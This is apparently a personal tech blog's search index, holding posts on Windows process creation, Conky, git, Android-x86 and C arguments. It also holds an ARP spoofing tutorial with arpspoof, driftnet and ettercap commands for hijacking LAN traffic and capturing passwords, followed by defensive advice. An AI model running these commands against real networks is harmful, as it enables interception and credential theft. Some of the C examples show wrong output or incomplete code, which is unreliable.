lpszCmdLine parameter can be NULL. In that case, the function uses the string pointed to by lpszImageName as the command line.‚Äã\tIf both lpszImageName and lpszCmdLine are non-NULL, *lpszImageName specifies the module to execute, and *lpszCmdLine specifies the command line. C runtime processes can use the argc and argv arguments.‚Äã\tIf the filename does not contain an extension, .EXE is assumed. If  the filename ends in a period (.) with no extension, or the filename  contains a path, .EXE is not appended.lpsaProcess: \tProcess safety attributeslpsaThread:\t Thread safety attributesfInheritHandles: \tWhether to inherit the attributes of the parent processfdwCreate: \tSpecifies additional flags that control the priority class and the  creation of the process. The following creation flags can be specified  in any combination, except as noted:            Value      Description                  CREATE_DEFAULT_ERROR_MODE      Not supported.              CREATE_NEW_CONSOLE      The new process has a new console, instead of inheriting the  parent‚Äôs console. This flag cannot be used with the DETACHED_PROCESS  flag.              CREATE_NEW_PROCESS_GROUP      Not supported.              CREATE_SEPARATE_WOW_VDM      Not supported.              CREATE_SHARED_WOW_VDM      Not supported.              CREATE_SUSPENDED      The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.              CREATE_UNICODE_ENVIRONMENT      Not supported.              DEBUG_PROCESS      If this flag is set, the calling process is treated as a debugger,  and the new process is a process being debugged. Child processes of the  new process are also debugged. The system notifies the debugger of all  debug events that occur in the process being debugged.              ¬†      If you create a process with this flag set, only the calling thread (the thread that called CreateProcess) can call the WaitForDebugEvent function.              DEBUG_ONLY_THIS_PROCESS      If this flag is set, the calling process is treated as a debugger,  and the new process is a process being debugged. No child processes of  the new process are debugged. The system notifies the debugger of all  debug events that occur in the process being debugged.              DETACHED_PROCESS      Not supported.      lpvEnvironment: \tPointer to current environment.lpszCurDir: \tPointer to current directory.lpsiStartInfo: \tPointer to STARTUPINFO structurelppiProcInfo: \tPointer to a PROCESS_INFORMATION structure that receives identification information about the new process.ExampleHere‚Äôs the Microsoft‚Äôs example:#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;void _tmain( int argc, TCHAR *argv[] ){    STARTUPINFO si;    PROCESS_INFORMATION pi;    ZeroMemory( &amp;si, sizeof(si) );    si.cb = sizeof(si);    si.wShowWindow = SW_HIDE;\t//hide window    ZeroMemory( &amp;pi, sizeof(pi) );    // Start the child process.     if( !CreateProcess( NULL,   // No module name (use command line)        \"cmd.exe /c ping localhost &gt;&gt; res.txt\",        // Command line        NULL,           // Process handle not inheritable        NULL,           // Thread handle not inheritable        FALSE,          // Set handle inheritance to FALSE        0,              // No creation flags        NULL,           // Use parent's environment block        NULL,           // Use parent's starting directory         &amp;si,            // Pointer to STARTUPINFO structure        &amp;pi )           // Pointer to PROCESS_INFORMATION structure    )     {        printf( \"CreateProcess failed (%d).\\n\", GetLastError() );        return;    }    // Wait until child process exits.    WaitForSingleObject( pi.hProcess, INFINITE );    // Close process and thread handles.     CloseHandle( pi.hProcess );    CloseHandle( pi.hThread );}Method 4Ôºö QProcess ‚Äì without cmd windowThe QProcess class is used to start external programs and to communicate with them. It‚Äôs a modern method to run a command.            Header      QProcess                  qmake      QT += core      Examples QProcess p(0);    p.start(\"cmd\", QStringList()&lt;&lt;\"/c\"&lt;&lt;\"ping localhost &gt;&gt; res.txt\");    p.waitForStarted();    p.waitForFinished();Another way:QProcess p(0);QString command = \"cmd.exe\";QStringList args;args.append(\"/c\");args.append(\"ping\");args.append(\"localhost\");args.append(\"&gt;&gt;\");args.append(\"res.txt\");p.execute(command, args);p.waitForFinished();//p.start(command, args);//p.waitForStarted();//p.waitForFinished();Full example://file: \"mainwindow.h\"#ifndef MAINWINDOW_H  #define MAINWINDOW_H  #include &lt;QtGui&gt;  class MainWindow : public QMainWindow  {      Q_OBJECT  public:      MainWindow(QWidget *parent = 0);          ~MainWindow();  private slots:      void openProcess();         void readResult(int exitCode);  private:      QProcess *p;  };  #endif // MAINWINDOW_H //file: \"mainwindow.cpp\"#include \"mainwindow.h\"   MainWindow::MainWindow(QWidget *parent)      : QMainWindow(parent)  {      p = new QProcess(this);      QPushButton *bt = new QPushButton(\"execute\", this);      connect(bt, SIGNAL(clicked()), this, SLOT(openProcess()));  }   MainWindow::~MainWindow()  {   }   void MainWindow::openProcess()  {      p-&gt;start(\"cmd.exe\", QStringList() &lt;&lt; \"/c\" &lt;&lt; \"ping localhost &gt;&gt; res.txt\");      connect(p, SIGNAL(finished(int)), this, SLOT(readResult(int)));  }   void MainWindow::readResult(int exitCode)  {      if(exitCode == 0)     {          QTextCodec* gbkCodec = QTextCodec::codecForName(\"GBK\");          QString result = gbkCodec -&gt; toUnicode(p -&gt; readAll());       }  }  At lastAt last, I recommand QProcess and CreateProcess."
  },
  
  {
    "title": "Penetration Testing | ARP Spoofing(Poisoning) in the internal network & How to prevent it",
    "url": "/posts/arp-spoofing/",
    "categories": "Pentest, Linux",
    "tags": "Pentest, Linux",
    "date": "2021-02-11 00:00:00 +0900",
    





    
    "snippet": "Address Resolution Protocol (ARP)  Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP  address) to a permanent physical machine address in a local ...",
    "content": "Address Resolution Protocol (ARP)  Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP  address) to a permanent physical machine address in a local area network (LAN). The physical machine address is also known as a Media Access  Control or MAC address.How ARP works?‚Äã\tWhen a new device is joined into a LAN,  it is assigned a unique IP address to use for identification and communication. When an incoming packet destined for a host machine on a particular LAN arrives at a gateway, the gateway asks the ARP program to find a MAC address that matches the IP address. A table called the ARP cache maintains a record of each IP  address and its corresponding MAC address.‚Äã\tIf the MAC address is not present in the ARP cache table then the source device will generate an ARP Request message. In the request message the source puts its own MAC address,  its IP address, destination IP address and the destination MAC address  is left blank since the source is trying to find this.‚Äã\tIn generally,  Address Resolution Protocol is used to obtain the MAC address of the destination host based on its IP address. It converts the IP address of the target host into a MAC address before sending a frame.Types of ARP Spoofing‚Äã\tThere are two types of ARP Spoofing:      For instance, there are three hosts A, B and C. A wants to communicate with B, when A asks C that whether he is B, C shamelessly says yes. So packages that A should have sent to B are sent to C.        Still that example, A wants to communicate with B, this time A asks that who is B, C shamelessly says again. So, A sends  packages to C, then C says to B: ‚ÄúI am A‚Äù and send the package to him.  What can we do?  Disconnect other devices‚Äô network connections  Hijack the traffic of other devices and gateways in the LAN to obtain sensitive information like password, browsing images and so onARP Spoofing Tutorial‚Äã\tFirst of all, host and target must be in a same LAN, of course.#0. Environment  Parrot OS(You can also use Kali Linux)  Wireless Network Card to connect to the WiFi.#1. Get local IP‚Äã\tOpen a terminal:$ sudo ifconfigor$ sudo ip addr show#2. Scan target‚Äôs IP‚Äã\tUsually we use Nmap to scan target‚Äôs IP:$ sudo nmap -sP 192.168.1.1/24(192.168.1.1 is the default gateway address, it depends your router.)‚Äã\tAnother easy way is use Zenmap, it‚Äôs an official GUI version of Nmap. It is a multi-platform (Linux, Windows, Mac OS X, BSD, etc.) free and open source application which aims to make Nmap easy for beginners to use.‚Äã\tThe easiest way is ‚Äì if you have already logged in the 192.168.1.1 ‚Äì sometimes admin as username and admin as password ‚Äì you see, quite easy.#3. Disconnect target‚Äôs connectionsUse arpspoof$ sudo arpspoof [-i interface] [-t target_ip] &lt;host_ip&gt;  interface: Your wireless interface(ifconfig to get)  target: Target‚Äôs IP address  host: Your IP address.‚Äã\tBecause the attacker did not enable port forwarding, the request could not be released, and the target‚Äôs network was disconnected. So if we enable port forwarding, we can hijack target‚Äôs traffic.#4. Hijack target‚Äôs traffic‚Äã\tEnable port forwarding:$ sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward‚Äã\tThen we use arpspoof like this:$ sudo arpspoof [-i interface] &lt;host_ip&gt; &lt;target_ip&gt;‚Äã\tBecause the target machine is connected to WiFi, when performing ARP Spoofing, you need to change the order with the target machine. If you don‚Äôt change it, you can see that the MAC address of the gateway is the same as the MAC address of the attacking machine during ARP Spoofing, so that the target machine cannot communicate normally.Use driftnet to get images‚Äã\tAfter hijacking the traffic successfully, we can save income images from target with driftnet(HTTP only).$ sudo driftnet [-i interface]‚Äã\tMoreover,$ sudo driftnet [-d directory] [-i interface]‚Äã\tto set directory that images will be saved.Use Ettercap to get passwords$ sudo ettercap -Tq [-i interface]  -T: Text mode  -q: Quiet mode‚Äã\tAlso, you can use Wireshark, it has a user-friendly GUI and easier for beginners.How to prevent ARP Spoofing?‚Äã\tTo be honest, it‚Äôs not hard to prevent ARP Spoofing, but many people don‚Äôt do like that.#1. Rely on Virtual Private Networks(VPN)‚Äã\tOne way to prevent ARP spoofing from happening in the first place is  to rely on Virtual Private Networks(VPN). When you connect to the internet, you typically first connect to an Internet Service Provider(ISP) in order to connect to another website. However, when you use a VPN, you‚Äôre using an encrypted tunnel that largely blocks your activity from ARP spoofing hackers. Both the method by which you‚Äôre conducting the online activity and the data that goes through it is encrypted.‚Äã\tMoreover, you should consider a VPN if you travel frequently or use public WiFi  hotspots while working with sensitive information or data. You could also consider using a mobile internet device that could help reduce the chances of someone working their way into your system through public WiFi with no login or password requirements. Although VPN can be a safer way to use the internet, it can sometimes slow down your online access due to the encrypting and decrypting processing power.#2.Get a Detection Tool‚Äã\tEven with ARP knowledge and techniques in place, it‚Äôs not always possible to detect a spoofing attack. Hackers are becoming increasingly stealthy at remaining undetected and use new technologies and tools to stay ahead  of their victims. Instead of strictly focusing on prevention, make sure  you have a detection method in place. Using a third-party detection tool can help you see when a spoofing attack is happening so you can work on stopping it in its tracks.‚Äã\tA third-party tool like XArp can help detect if you are being attacked by ARP spoofing. However, that‚Äôs just the first step to ARP spoofing protection. In addition to using the right tools, you should also consider a robust monitoring tool or service.Some third-party tools:  Arpwatch: If the cross-platform open-source tool Arpwatch is integrated into a  local IPv4 network, it continuously records all ARP activities in the  LAN. All inbound ARP packets are taken by the program along with  accompanying address information and stored in a central database. If  older entries are found that don‚Äôt match the data currently being sent,  the program sends an email warning to the administrator. The procedure  is effective, but is only suitable for networks with static IP  addresses. If LAN IPs are distributed dynamically over a DHCP server,  any change in the IP/MAC mapping results in a false alarm.  ARP-Guard: ARP-Guard from the company ISL also monitors the internal network and relies on two different sensors. The LAN sensor works similarly to Arpwatch, analyzing inbound data packets and sounding an alarm in case of any discrepancies. The sensor management architecture of the software also has an SNMP sensor, which uses the Simple Network Management Protocol(SNMP) to access devices connected to the LAN and read out their ARP tables. In this way, not only are ARP attacks localized and warded off; the integrated address management also allows administrators to detect unwanted devices and prevent them from accessing the network.  XArp: The XArp software relies on both active and passive modules to protect a network from ARP spoofing. The passive modules analyze ARP packets that are sent on the network, and match the accompanying address assignment with older entries. If discrepancies are noticed, the program alarm sounds. The control mechanism is based on statistical analyses and checks the network traffic on the basis on of various patterns which, according to developers, indicate ARP attacks. The sensitivity of this traffic filter can be adjusted gradually. The active modules of the software send their own packets into the network, in order to validate the ARP tables of the accessible devices and to fill them with valid entries.#3.MAC Address Binding‚Äã\tBinding MAC address is the easiest way the prevent ARP Spoofing, in Linux, just use:$ sudo arp -s &lt;ip&gt; &lt;mac&gt;\t#Bind MAC address$ sudo arp -d &lt;ip&gt; &lt;mac&gt;\t#Disbing MAC address  ip: Your IP address  mac: Your MAC address‚Äã\tIn Windows, open cmd:arp -s &lt;ip&gt; &lt;mac&gt;\t#temporary‚Äã\tornetsh i i show in\t#show Idxnetsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt; store=active\t#temporarynetsh -c i i add ne &lt;Idx&gt; &lt;ip&gt; &lt;mac&gt;netsh -c i i del ne &lt;Idx&gt;\t#Disbing MAC address‚Äã\t(Some routers have functions to bind MAC address too.)"
  },
  
  {
    "title": "Syntax Error | Conky syntax update",
    "url": "/posts/new-conky/",
    "categories": "Linux, Beautify",
    "tags": "Linux, Beautify",
    "date": "2021-01-29 00:00:00 +0900",
    





    
    "snippet": "Features(Github)Conky can display more than 300 built-in objects, including support for:  A plethora of OS stats (uname, uptime, CPU usage, mem usage, disk usage, ‚Äútop‚Äù like process stats, and netw...",
    "content": "Features(Github)Conky can display more than 300 built-in objects, including support for:  A plethora of OS stats (uname, uptime, CPU usage, mem usage, disk usage, ‚Äútop‚Äù like process stats, and network monitoring, just to name a few).  Built-in IMAP and POP3 support.  Built-in support for many popular music players (MPD, XMMS2, Audacious).  Can be extended using built-in Lua support, or any of your own scripts and programs (more).  Built-in Imlib2 and Cairo bindings for arbitrary drawing with Lua (more).  Runs on Linux, FreeBSD, OpenBSD, DragonFlyBSD, NetBSD, Solaris, Haiku, and macOS!‚Ä¶ and much much more.Conky can display information either as text, or using simple progress bars and graph widgets, with different fonts and colours.Syntax‚Äã\tAfter upgrade the whole system, I found conky doesn‚Äôt work well, the terminal pops out syntax error when running conky. Yes, the syntax changed, I have to rewrite the .conkyrc.‚Äã\tBefore updating, conky‚Äôs syntax is easy, very easy to understand, now, it‚Äôs more like‚Ä¶ eh‚Ä¶ TOML? I don‚Äôt know, but as a programmer, a geek, the new syntax seems better to adapt to.‚Äã\tSo, let‚Äôs take a look at the newest demos:--[[Conky, a system monitor, based on torsmoAny original torsmo code is licensed under the BSD licenseAll code written since the fork of torsmo is licensed under the GPLPlease see COPYING for detailsCopyright (c) 2004, Hannu Saransaari and Lauri HakkarainenCopyright (c) 2005-2019 Brenden Matthews, Philip Kovacs, et. al. (see AUTHORS)All rights reserved.This program is free software: you can redistribute it and/or modifyit under the terms of the GNU General Public License as published bythe Free Software Foundation, either version 3 of the License, or(at your option) any later version.This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See theGNU General Public License for more details.You should have received a copy of the GNU General Public Licensealong with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.]]conky.config = {    alignment = 'top_left',    background = false,    border_width = 1,    cpu_avg_samples = 2,    default_color = 'white',    default_outline_color = 'white',    default_shade_color = 'white',    double_buffer = true,    draw_borders = false,    draw_graph_borders = true,    draw_outline = false,    draw_shades = false,    extra_newline = false,    font = 'DejaVu Sans Mono:size=12',    gap_x = 60,    gap_y = 60,    minimum_height = 5,    minimum_width = 5,    net_avg_samples = 2,    no_buffers = true,    out_to_console = false,    out_to_ncurses = false,    out_to_stderr = false,    out_to_x = true,    own_window = true,    own_window_class = 'Conky',    own_window_type = 'desktop',    show_graph_range = false,    show_graph_scale = false,    stippled_borders = 0,    update_interval = 1.0,    uppercase = false,    use_spacer = 'none',    use_xft = true,}conky.text = [[${color grey}Info:$color ${scroll 32 Conky $conky_version - $sysname $nodename $kernel $machine}$hr${color grey}Uptime:$color $uptime${color grey}Frequency (in MHz):$color $freq${color grey}Frequency (in GHz):$color $freq_g${color grey}RAM Usage:$color $mem/$memmax - $memperc% ${membar 4}${color grey}Swap Usage:$color $swap/$swapmax - $swapperc% ${swapbar 4}${color grey}CPU Usage:$color $cpu% ${cpubar 4}${color grey}Processes:$color $processes  ${color grey}Running:$color $running_processes$hr${color grey}File systems: / $color${fs_used /}/${fs_size /} ${fs_bar 6 /}${color grey}Networking:Up:$color ${upspeed} ${color grey} - Down:$color ${downspeed}$hr${color grey}Name              PID     CPU%   MEM%${color lightgrey} ${top name 1} ${top pid 1} ${top cpu 1} ${top mem 1}${color lightgrey} ${top name 2} ${top pid 2} ${top cpu 2} ${top mem 2}${color lightgrey} ${top name 3} ${top pid 3} ${top cpu 3} ${top mem 3}${color lightgrey} ${top name 4} ${top pid 4} ${top cpu 4} ${top mem 4}]]‚Äã\tIt looks like this:‚Äã\tYes, inside the --[[and ]] is the comments. conky.config = { marks the beginning of the config part and } means the end.different types of variable such as ‚Äúnumber‚Äù, characters('char'), boolean(true &amp; false) will be assigned to the properties which is to the left of the equal sign, just like most program languages. Of course, inside conky.text = [[ and ]], you could customize your conky‚Äôs appearance and looks, you don‚Äôt need to change a lot even though syntax updated.My .conkyrc            ‚Äã\tIt‚Äôs easy to update the own configure file, mine works well now: .conkyrc. Screenshots goes here: [Conky      Awesome system monitor for Linux](https://theodorecooper.github.io/2021-conky/).      More ‚Äì Wiki‚Äã\tMore options and tutorial here: Conky Wiki(Github)."
  },
  
  {
    "title": "Conky | Awesome system monitor for Linux",
    "url": "/posts/conky/",
    "categories": "Linux, Beautify",
    "tags": "Linux, Beautify",
    "date": "2021-01-15 00:00:00 +0900",
    





    
    "snippet": "About Conky‚Ä¶  Conky is a free software desktop system monitor for the X Window System. It is available for Linux, FreeBSD, and OpenBSD. Conky is highly configurable and is able to monitor many syst...",
    "content": "About Conky‚Ä¶  Conky is a free software desktop system monitor for the X Window System. It is available for Linux, FreeBSD, and OpenBSD. Conky is highly configurable and is able to monitor many system variables including the status of the CPU, memory, swap space (what is swap space?), disk storage, temperatures, processes, network interfaces, battery power, system messages, e-mail inboxes, Arch Linux updates, many popular music players, weather updates, breaking news, and much more. Unlike system monitors that use high-level widget toolkits to render their information, Conky is drawn directly in an X window.  This allows it to be configured such that it consumes relatively few  system resources.‚Äã\tAre you getting bored with your dull backgrounds? Let‚Äôs use conky to improve that.Common uses‚Äã\tIf you‚Äôre using Pinguy OS or CrunchBang Linux(‚Ä¶). Conky is pre-configured in the default installation, but I think most of users are using Debian, Ubuntu, Fedora and so on. Conky is not installed by default in these systems. We should install conky first.Get conky  Open up a terminal window  Type following command and your sudo password$ sudo apt-get install conky-all  When prompted, accepted the installation by typing yConfigure a theme‚Äã\tWhat conky does is read the /etc/conky/conky.config file (when no ~/.conkyrc file is present) and display as you set. So there are tow solutions to have a good looking conky: either you modify the configure file on your own or you download a conky theme from the Internet and use it directly. There are many websites which could provide with plenty of awesome conky themes:  Deviant Art  Open Desktop‚Äã\tUsing these conky themes is similar to installing source code. A good conky theme will come with a README that  tells you what to change in the conky theme files and other important  things about using the conky theme. Most of the time you have to change  the path to image files or Lua script.Launch conky‚Äã\tIt‚Äôs easy to launch conky:$ conkyUsage example‚Äã\tA simple configuration for Conky which displays the time on a user‚Äôs desktop is as follows:update_interval 30own_window yesown_window_type desktopuse_xft yesxftfont DejaVu Sans:size=14alignment bottom_rightTEXT${time %H:%M}‚Äã\tHere‚Äôs my .conkyrc:# set to yes if you want Conky to be forked in the backgroundbackground nocpu_avg_samples 2net_avg_samples 2out_to_console no# X font when Xft is disabled, you can pick one with program xfontsel#font 7x12#font 6x10#font 7x13#font 8x13#font 7x12#font *mintsmild.se*#font -*-*-*-*-*-*-34-*-*-*-*-*-*-*#font -artwiz-snap-normal-r-normal-*-*-100-*-*-p-*-iso8859-1# Use Xft?use_xft yes# Xft font when Xft is enabledxftfont Sans:size=11  own_window_argb_visual yes#own_window_colour hotpink# Text alpha when using Xftxftalpha 0.8# on_bottom yes# mail spool# mail_spool $MAIL# Update interval in secondsupdate_interval 1# Create own window instead of using desktop (required in nautilus)own_window yesown_window_transparent yesown_window_hints undecorated,below,sticky,skip_taskbar,skip_pager#own_window_type overrideown_window_type dock# Use double buffering (reduces flicker, may not work for everyone)double_buffer yes# Minimum size of text areaminimum_size 260 5maximum_width 400# Draw shades?draw_shades no# Draw outlines?draw_outline no# Draw borders around textdraw_borders no# Stippled borders?stippled_borders no# border margins# border_margin 4# border widthborder_width 1# Default colors and also border colorsdefault_color whitedefault_shade_color whitedefault_outline_color white# Text alignment, other possible values are commented#alignment top_left#minimum_size 10 10gap_x 10gap_y 35alignment top_right#alignment bottom_left#alignment bottom_right# Gap between borders of screen and text# Add spaces to keep things from moving about?  This only affects# certain objects.use_spacer none# Subtract file system buffers from used memory?no_buffers yes# set to yes if you want all text to be in uppercaseuppercase no# none, xmms, bmp, audacious, infopipe (default is none)# xmms_player bmpTEXT${color #006400}SYSTEM ${hr 1}#Time:$alignr${time %Y.%m.%d}$alignc   ${time %H:%M:%S}$alignr   Week:${time %w}Hostname:                Parrot SecurityKernel: $alignr$kernelMachine:$alignr$machineTemp: ${alignr}${exec sensors | grep 'Core 0' | cut -c17-22}C###############${color #FF8C00}MEMORY ${hr 1}Ram ${alignr}$mem / $memmax ($memperc%)${membar 4}Highest MEM $alignr MEM%${top_mem name 1}$alignr ${top_mem mem 1}${top_mem name 2}$alignr ${top_mem mem 2}${top_mem name 3}$alignr ${top_mem mem 3}##############${color #BC8F8F}CPU ${hr 1}Frequency: ${alignr}${freq dyn} MHzProcesses: ${alignr}$processes ($running_processes running)Load: ${alignr}$loadavgCPU1 ${alignr}${cpu cpu1}%${cpubar 4 cpu1}CPU2 ${alignr}${cpu cpu2}%${cpubar 4 cpu2}Highest CPU $alignr CPU%${top name 1}$alignr${top cpu 1}${top name 2}$alignr${top cpu 2}${top name 3}$alignr${top cpu 3}##############${color #228B22}FILE SYSTEM ${hr 1}Root: ${alignr}${fs_free /} / ${fs_size /}${fs_bar 4 /}#############${color white}ETHERNET ${hr 1}${color}Down ${downspeed eth0} /s ${alignr}Up ${upspeed eth0} /s${downspeedgraph eth0 25,107} ${alignr}${upspeedgraph eth0 25,107}Total ${totaldown eth0} ${alignr}Total ${totalup eth0}#############${color white}WLAN ${hr 1}${color}Down ${downspeed wlx48022a54bc53} /s ${alignr}Up ${upspeed wlx48022a54bc53} /s${downspeedgraph wlx48022a54bc53 25,107} ${alignr}${upspeedgraph wlx48022a54bc53 25,107}Total ${totaldown wlx48022a54bc53} ${alignr}Total ${totalup wlx48022a54bc53}#############‚Äã\tIt looks like this:‚Äã\tYou can download here: .conkyrcConfigure with GUI[Beginner]‚Äã\tConky Manager is a friendly GUI tool developed to use conky easier.‚Äã\tUse the following commands in terminal to install Conky Manager:$ sudo add-apt-repository ppa:teejee2008/ppa$ sudo apt-get update$ sudo apt-get install conky-manager‚Äã\tLaunch the Conky Manager and have fun!Advanced Usage &amp; IssuesStart conky automatically‚Äã\tYou can write a shell script to start conky automatically:#!/bin/shecho ‚Äô ‚Äô | sudo -S pm-powersavesleep 3conky &amp; disownsleep 30pkill run.sh‚Äã\tThen add it to startup applications list.Conky disappears‚Ä¶‚Äã\tIf conky disappears on clicking desktop in desktop environments like Mate, Gnome and so on, this may help you:‚Äã\tchange own_window_type desktop to:own_window_type dock‚Äã\tOr you will prefer to hidden desktop icons, the conky won‚Äôt disappear either(but of course you can‚Äôt see desktop icons)."
  },
  
  {
    "title": "Delete single file & folder from a Github repository",
    "url": "/posts/githubrm/",
    "categories": "Github",
    "tags": "Github",
    "date": "2021-01-02 00:00:00 +0900",
    





    
    "snippet": "  Sometimes we need to delete single file or folder in a git respository.‚Äã\tFirst of all, we use Git Bash in Windows (or Terminal in Linux, OSX).Clone Repository$ git clone https://xxxx/xxx/Remove l...",
    "content": "  Sometimes we need to delete single file or folder in a git respository.‚Äã\tFirst of all, we use Git Bash in Windows (or Terminal in Linux, OSX).Clone Repository$ git clone https://xxxx/xxx/Remove local file &amp; folder$ cd xxx/$ git rm file.file\t#remove single file$ git rm -r folder/\t#remove folderCommit$ git commit -m \"remove some files\"Push$ git push origin xxxx\t#xxxx is your branch"
  },
  
  {
    "title": "Here‚Äôs to 2021!",
    "url": "/posts/coming2021/",
    "categories": "Other",
    "tags": "Other",
    "date": "2021-01-01 00:00:00 +0900",
    





    
    "snippet": "Here's to 2021!2021Wishing youPeace, health, happinessand prosperityin coming year‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îì ‚îó‚îÅ‚îì‚îÉ‚îÉ‚îè‚îì‚îÉ‚îó‚îÅ‚îì‚îÉ    ‚îÉ ‚îÉ‚îè‚îÅ‚îõ‚îÉ‚îÉ‚îÉ  ‚îÉ‚îÉ‚îè‚îÅ‚îõ‚îÉ    ‚îÉ ‚îÉTheodore Cooper‚îÉ‚îè‚îÅ‚îõ‚îÉ‚îÉ  ‚îÉ‚îÉ‚îÉ‚îè‚îÅ‚îÉ    ‚îÉ ‚îÉ‚îÉ‚îó‚îÅ‚îì‚îÉ‚îó‚îõ‚îÉ ‚îÉ‚îó‚îÅ‚îì    ‚îÉ ‚îÉ‚îó‚îÅ‚îÅ...",
    "content": "Here's to 2021!2021Wishing youPeace, health, happinessand prosperityin coming year‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îÅ‚îì‚îè‚îÅ‚îì ‚îó‚îÅ‚îì‚îÉ‚îÉ‚îè‚îì‚îÉ‚îó‚îÅ‚îì‚îÉ    ‚îÉ ‚îÉ‚îè‚îÅ‚îõ‚îÉ‚îÉ‚îÉ  ‚îÉ‚îÉ‚îè‚îÅ‚îõ‚îÉ    ‚îÉ ‚îÉTheodore Cooper‚îÉ‚îè‚îÅ‚îõ‚îÉ‚îÉ  ‚îÉ‚îÉ‚îÉ‚îè‚îÅ‚îÉ    ‚îÉ ‚îÉ‚îÉ‚îó‚îÅ‚îì‚îÉ‚îó‚îõ‚îÉ ‚îÉ‚îó‚îÅ‚îì    ‚îÉ ‚îÉ‚îó‚îÅ‚îÅ‚îõ‚îó‚îÅ‚îÅ‚îõ ‚îó‚îÅ‚îÅ‚îõ‚îó‚îÅ‚îõ"
  },
  
  {
    "title": "Install Android x86 in VMware & Virtualbox",
    "url": "/posts/androidx86/",
    "categories": "Linux",
    "tags": "Linux",
    "date": "2021-01-01 00:00:00 +0900",
    





    
    "snippet": "  What‚Äôs Android x86?  First, get Android x86  Installation  Finally &amp; Setup Android x86  Moreover‚Ä¶What‚Äôs Android x86?  ‚Äã\tAndroid-x86 is an open source project licensed under Apache Public Lice...",
    "content": "  What‚Äôs Android x86?  First, get Android x86  Installation  Finally &amp; Setup Android x86  Moreover‚Ä¶What‚Äôs Android x86?  ‚Äã\tAndroid-x86 is an open source project licensed under Apache Public License 2.0 that makes an unofficial  porting of Google‚Äôs Android mobile operating system to run on devices  powered by AMD and Intel x86 processors, rather than RISC-based ARM chips. Developers Chih-Wei Huang and Yi Sun originated the project in 2009.‚Äã\tPlatform:  Linux (Windows, OSX is also suitable for this article)  VMware 15 (Virtualbox is also suitable)  Android x86 (Here I use Android-x86 6.0)First, get Android x86‚Äã\tFirst, we need an image to install Android x86. I suggest downloading from the official website: https://www.android-x86.org/.Installation  Create a new virtual machine.  Use the ISO image that you downloaded from the website.  Give it a name?  We need at least 2GB memory to run Android x86.  Create virtual disk, I recommend 40GB and more.  Now, let‚Äôs start the vm  Choose Installation - Install Android-x86 to harddisk   Do not use GPT!!! üò≠  Create new partition  Set Primary.  Set Bootable.  Write partition table to disk.  Enter ‚Äúyes‚Äù to write.  Quit cfdisk.  Select the partition.  Format as ext4 (recommend)  Install boot loader.  Install /system as read-write.  Installing‚Ä¶--- A few moments later ---  Reboot (better not choose Run Android-x86).  Here‚Äôs the Grub!!! Boot Android-x86 6.0-r3!!!‚Äã\tBut‚Ä¶, oops!  All right, maybe we should configure this system further. The solution is editing the grub in Debug mode.  After enter the command line, firstly it needs to remount /mnt as rw.  Use vim to edit the /mnt/grub/menu.lst.  Add nomodeset after quiet like this:  Save &amp; RebootFinally &amp; Setup Android x86‚Äã\tSuccessfully boot Android x86!!!  Set date &amp; time.  Your beautiful name:  Complete!!!Moreover‚Ä¶  If installed applications crashes easily, please run enable_houdini in terminal.  Have fun!!!"
  },
  
  {
    "title": "C Tutorial -- Command Line Arguments",
    "url": "/posts/C-Tutorial-arg/",
    "categories": "C/C++, Linux",
    "tags": "C/C++, Linux",
    "date": "2020-12-26 00:00:00 +0900",
    





    
    "snippet": "What is Command Line Arguments‚Äã\tWhen executing the program, you can pass values to the C program from the command line. These values are called command line arguments, and they are important to the...",
    "content": "What is Command Line Arguments‚Äã\tWhen executing the program, you can pass values to the C program from the command line. These values are called command line arguments, and they are important to the program, especially when you want to control the program from the outside, rather than hard-coding these values in the code. Even all the program in Linux will provide command line arguments.Use Command Line Arguments‚Äã\tCommand line arguments are handled using main() function arguments, where argc refers to the number of arguments passed in, and argv[] is an pointer array which point to each argument passed to the program. The following is a simple example:#include &lt;stdio.h&gt;int main( int argc, char *argv[] )  {   if( argc == 2 )   {      printf(\"The argument supplied is %s\\n\", argv[1]);   }   else if( argc &gt; 2 )   {      printf(\"Too many arguments.\\n\");   }   else   {      printf(\"No argument.\\n\");   }}‚Äã\tIt produces the following result:  No argument$./a.outNo argument.  Single argument$./a.out aaarrrgggThe argument supplied is aaarrrggg  Two arguments &amp; Above$./a.out arg1 arg2Too many arguments.Explanation ‚Äî argv[0], argv[1]‚Ä¶‚Äã\tYou should know that argv[0] holds the name of the program itself and argv[1]  is a pointer to the first command line argument supplied, and *argv[n]  is the last argument. If no arguments are supplied, argc will be 1,  and if you pass one argument then argc is set at 2.‚Äã\tYou pass all the command line arguments separated by a space, but if  argument itself has a space then you can pass such arguments by putting  them inside double quotes \" \" or single quotes ' '.  So, let‚Äôs try this:$./a.out \"arg1 arg2\"The argument supplied is aaarrrggggetopt() &amp; getopt_long()‚Äã\tIn Linux, we can use getopt() and getopt_long() to pass arguments:#include&lt;stdio.h&gt;int main(int argc, char *argv[]){    char *optstr = \"p:n:m:c:\";    struct option opts[] = {        {\"path\", 1, NULL, 'p'},        {\"name\", 1, NULL, 'n'},        {\"mtime\", 1, NULL, 'm'},        {\"ctime\", 1, NULL, 'c'},        {0, 0, 0, 0},    };    int opt;    while((opt = getopt_long(argc, argv, optstr, opts, NULL)) != -1){        switch(opt) {            case 'p':                strcpy(path, optarg);                break;            case 'n':                strcpy(targetname, optarg);                break;            case 'm':                modifiedtime = atoi(optarg);                break;            case 'c':                changetime = atoi(optarg);                break;            default:                if(strchr(optstr, optopt) == NULL){                    fprintf(stderr, \"unknown option '-%c'\\n\", optopt);                }else{                    fprintf(stderr, \"option requires an argument '-%c'\\n\", optopt);                }                return 1;        }    }    findInDir(path);    return 0;}"
  },
  
  {
    "title": "Beginner's Guide to Search Engine Optimization (SEO)",
    "url": "/posts/seo/",
    "categories": "Blogging",
